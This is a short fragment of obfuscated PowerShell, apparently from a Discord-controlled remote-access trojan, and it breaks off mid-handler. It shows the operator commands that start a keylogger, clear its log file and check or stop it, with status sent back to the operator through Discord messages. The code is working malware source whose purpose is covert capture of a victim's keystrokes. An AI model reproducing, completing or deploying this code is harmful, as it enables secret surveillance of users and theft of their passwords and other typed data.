            "keylog" {
                $VvYns = ""
                if ($BktMd) { $VvYns = ($BktMd.Trim() -split '\s+')[0].ToLower() }
                if ($VvYns -eq "clear") {
                    Remove-Item -LiteralPath $script:keylogLogFile -Force -EA SilentlyContinue
                    Send-DiscordMessage -Content "Log cleared" -ReplyToId $msgId
                    return
                }
                $qUNra = Start-KeyLog
                Send-DiscordMessage -Content "$qUNra`nDung: ``!keystop`` | Check: ``!keystat``" -ReplyToId $msgId
                return
            }

            "keystop" {
                if (-not $script:keylogPid -and -not (Test-Path -LiteralPath $script:keylogPidFile)) {
